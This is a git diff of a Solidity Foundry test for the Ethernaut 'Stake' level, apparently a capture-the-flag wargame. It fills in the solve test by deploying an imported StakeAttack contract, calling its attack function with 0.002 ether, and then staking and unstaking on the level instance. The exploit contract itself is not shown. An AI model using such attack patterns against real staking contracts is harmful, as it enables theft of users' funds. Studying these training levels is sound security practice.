@@ -11,6 +11,8 @@ import {Ethernaut} from "src/Ethernaut.sol";
 import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
 
 import {console} from "forge-std/console.sol";
+import {StakeAttack} from "../../src/attacks/StakeAttack.sol";
+
 contract TestStake is Test, Utils {
     Ethernaut ethernaut;
     Stake instance;
@@ -60,5 +62,11 @@ contract TestStake is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
+        StakeAttack a = new StakeAttack(instance);
+        a.attack{value: 0.002 ether}();
+        instance.StakeETH{value:0.002 ether}();
+        instance.Unstake(0.002 ether);
+
+
     }
 }
